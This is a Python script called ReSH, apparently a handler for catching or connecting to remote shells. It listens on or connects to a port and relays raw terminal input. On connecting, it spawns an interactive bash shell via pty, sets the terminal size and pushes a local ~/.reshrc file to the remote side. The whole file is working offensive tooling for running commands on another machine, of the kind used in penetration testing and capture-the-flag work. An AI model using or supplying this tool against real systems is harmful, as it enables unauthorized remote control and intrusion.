#!/usr/bin/python3

import os
import socket
import sys
import threading
import time

try:
	import tty
	import termios
except:
	print('Please install tty and termios')
	imported = False
else:
	imported = True


def setTTY():
	fd = sys.stdin.fileno()
	oldSet = termios.tcgetattr(fd)
	# os.system('stty raw -echo')
	tty.setraw(0)
	return fd, oldSet

def resetTTY(fd, oldSet):
	termios.tcsetattr(fd, termios.TCSADRAIN, oldSet)

def recvLoop(sock):
	sock.settimeout(1.0)
	while True:
		data = None
		try:
			data = sock.recv(10000000)
		except socket.timeout:
			continue
		except OSError:
			break
		except Exception as e:
			print(e)
		print(data)
		if data == b'' or data == None:
			break
		data = data.decode(errors='ignore')
		cprint(data)
	sock.close()

def cprint(data):
	print(data, end='', flush=True)

def connect(host, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host, port))
	return sock

def bind(port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind(('', port))
	sock.listen(1)
	client, addr = sock.accept()
	print('{} <= {}'.format(client.getsockname()[0], addr[0]))
	return sock, client

def rc(sock):
	rc_path = os.path.expanduser('~') + '/.reshrc'
	if os.path.exists(rc_path):
		with open(rc_path, 'rb') as fd:
			sock.send(fd.read())

def generateCmdRow():
	size = os.get_terminal_size()
	return 'stty rows {} columns {}\n'.format(size.lines, size.columns).encode()

def choice():
	cprint('\r\n')
	cprint('(1) Exit\r\n')
	cprint('(2) Resize Terminal\r\n')
	cprint('(3) Reload Reshrc\r\n')
	cprint('(4) Get IP\r\n')
	cprint('> ')
	chc = sys.stdin.read(1)
	if chc == '1':
		sock.send(b'exit\n')
	elif chc == '2':
		sock.send(generateCmdRow())
	elif chc == '3':
		rc(sock)
		sock.send(b'\n')
	elif chc == '4':
		print(sock.getsockname()[0], end='\r\n')
		sock.send(b'\n')
	else:
		sock.send(b'\n')
	return chc

print('''
██████╗░███████╗░██████╗██╗░░██╗
██╔══██╗██╔════╝██╔════╝██║░░██║
██████╔╝█████╗░░╚█████╗░███████║
██╔══██╗██╔══╝░░░╚═══██╗██╔══██║
██║░░██║███████╗██████╔╝██║░░██║
╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝

To exit: ² or Ω
''')
if len(sys.argv) == 2:
	serv, sock = bind(int(sys.argv[1]))
elif len(sys.argv) == 3:
	sock = connect(sys.argv[1], int(sys.argv[2]))
else:
	print('''Usage:
Client: resh [IP] [PORT]
Server: resh [PORT]''')
	exit(1)

sock.send(b'export TERM=xterm\n')
sock.send(b'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n')
cprint('\r\n')

if imported:
	fd, oldSet = setTTY()
thr = threading.Thread(target=recvLoop, args=(sock,))
thr.start()

time.sleep(1)
sock.send(generateCmdRow())
rc(sock)

while True:
	c = sys.stdin.read(1)
	if c == '\r':
		c = '\n'
	elif c == '²' or c == 'Ω':
		sock.send(b'exit\n')
		break
	elif c == '\x13': # Ctrl+s
		chc = choice()
		if chc == '1':
			break
		c = ''
	try:
		sock.send(c.encode())
	except BrokenPipeError:
		break
	except OSError:
		print('\r\nOSError: Close ReSH\r')
		break
	except Exception as e:
		print(e)

if imported:
	resetTTY(fd, oldSet)
sock.close()
serv.close()
thr.join()
